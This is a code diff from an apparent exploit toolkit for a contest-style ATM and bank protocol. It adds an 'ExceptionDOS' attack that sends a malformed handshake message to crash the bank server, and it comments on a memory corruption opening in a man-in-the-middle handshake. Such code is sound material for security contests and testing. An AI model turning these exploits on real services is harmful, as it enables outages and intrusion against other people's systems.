@@ -60,7 +60,8 @@ main' ["ActiveMITM", atmPort', bankPort'] = do
 
 main' ["ExceptionDOS", atmPort', bankPort'] = do
     let (_, bankPort) = validatePorts atmPort' bankPort'
-    -- TODO: merge brian's exploit code
+    bank <- connectTo "localhost" bankPort
+    exceptionDOS bank
     return ()
 
 main' ["RCE", atmPort', bankPort'] = do
@@ -128,7 +129,7 @@ mitmHandshake atm bank logTo logFrom = do
     putStr "Raw AES key: " >> print rawAES
     let aes = makeAES rawAES
     mitmAES <- pubEncrypt rawAES
-    B.hPutStr bank mitmAES -- TODO: memory corruption exploit
+    B.hPutStr bank mitmAES -- memory corruption exploit possible here, see handshakeExploit
     expect bank "DUMMY"
     B.hPut atm "DUMMY"
     encIV <- B.hGetSome atm bufferSize
@@ -148,6 +149,17 @@ mitmHandshake atm bank logTo logFrom = do
     expect bank "DUMMY"
     B.hPut atm "DUMMY"
     return (aes, aesIV)
+
+{-
+terminate called after throwing an instance of 'CryptoPP::InvalidArgument'
+  what():  RSA/OAEP-MGF1(SHA-1): ciphertext length of 5 doesn't match the required length of 384 for this key
+Aborted
+-}
+exceptionDOS bank = do
+    let bufferSize = 4096
+    B.hPut bank "DUMMY"
+    bankPubRaw <- B.hGetSome bank bufferSize
+    B.hPutStr bank "Hello"
 
 handshakeExploit bankPort = do
     let bufferSize = 4096
